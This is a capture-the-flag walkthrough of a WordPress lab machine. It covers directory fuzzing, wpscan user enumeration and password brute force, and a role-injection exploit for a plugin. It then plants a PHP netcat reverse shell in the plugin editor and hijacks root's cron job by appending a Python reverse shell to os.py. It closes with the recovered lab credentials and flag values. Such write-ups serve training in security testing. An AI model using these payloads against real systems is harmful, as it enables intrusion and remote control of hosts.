## RECONNAISSANCE

***

Let's check the web application, we need to add `jack.thm` to `/etc/hosts`:

```
echo '10.10.153.131 jack.thm' | sudo tee -a /etc/hosts
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250617125606.png)

Time to fuzz, let's find anything hidden on here:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://jack.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

Not much, the scan said that `robots.txt` entrance is allowed, let's check:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617125947.png)

Since we got `wp-admin`, we know that we are dealing with a WordPress installation, no need to check the login page since we don't have credentials yet, instead, let's use `wpscan` to enumerate the web application:

```bash
wpscan --url http://jack.thm -e u

As seen, we find some users, we're also dealing with `wordpress 5.3.2`, since we got users, we can try brute forcing the `wp-admin` page to get credentials, let's proceed to exploitation.

## EXPLOITATION

***

So, we already know we must brute force or that's the path we're going to take, let's save the following usernames in a file:

```
jack
wendy
danny
```

Now we can brute force:

```
wpscan -U users.txt -P /usr/share/wordlists/fasttrack.txt --url http://jack.thm
```

After a couple minutes of wait, we get credentials for Wendy, if you want to speed up the process, just use Wendy as the username:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617132550.png)

```
wendy:changelater
```

Let's login:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617132639.png)

![](gitbook/cybersecurity/images/Pasted%20image%2020250617132721.png)

Unfortunately for us, we cannot do much to get a reverse shell yet, we need to exploit this:

`EXPLOIT: https://www.exploit-db.com/exploits/44595`

![](gitbook/cybersecurity/images/Pasted%20image%2020250617153937.png)

Basically, we need to intercept the request and change a parameter, let's do it:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617154114.png)

Click on Update Profile:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617154612.png)

On here we need to add:

```
&ure_other_roles=administrator&
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250617154700.png)

Once we send the request, we notice our dashboard changed:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617154828.png)

We got new functionalities, we can get a shell through the `plugin editor`:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617154915.png)

We can simply add this on top:

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.28 9001 >/tmp/f);?>
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155345.png)

Save it and now we need to trigger it:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155131.png)

To trigger it, we need to go to `Installed Plugins` and activate it:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155159.png)

If we check our listener:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155405.png)

Ok time for privilege escalation.

## PRIVILEGE ESCALATION

***

First of all, let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155558.png)

Now we're good to go, let's check users:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155642.png)

We only got `jack`, let's check his home:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155725.png)

We got a `reminder.txt` file:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617155949.png)

They talking bout some backups, let's use linpeas to check that:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617161259.png)

As seen, inside of `/var/backups` we can find the `id_rsa` for jack, let's grab it and get into ssh:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617161410.png)

Nice, it works, we can run linpeas again and `pspy` to check active processes and any other relevant info that may help us to get into root:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617161855.png)

Every minute, a `/opt/statuscheck/checker.py` script runs as root, let's check what it does and if we can modify it:

```python
jack@jack:/tmp$ cat /opt/statuscheck/checker.py
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

As seen, this runs `os.system` and uses curl to save a log, we don't have write permission on this file unfortunately so we need another way to exploit this.

Once we use linpeas, we notice we are part of the family group, this group has write permissions over `/usr/lib/python 2.7`:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617162155.png)

![](gitbook/cybersecurity/images/Pasted%20image%2020250617162303.png)

What we can do is modify the `os.py` file to embed a reverse shell that will triggers once the cronjob scripts runs, let's do it, we need to modify:

```
/usr/lib/python2.7/os.py
```

We can add this at the end of the script, you can go to the last line on nano using:

```
alt /
```

Add the following:

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("VPN_IP",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250617162534.png)

Now, save it and start the listener, once the script runs again, we will receive a shell:

![](gitbook/cybersecurity/images/Pasted%20image%2020250617162645.png)

We can now read both flags and end the CTF:

```
root@jack:~# cat /home/jack/user.txt
0052f7829e48752f2e7bf50f1231548a

root@jack:~# cat /root/root.txt
b8b63a861cc09e853f29d8055d64bffb
```

![](gitbook/cybersecurity/images/Pasted%20image%2020250617162752.png)
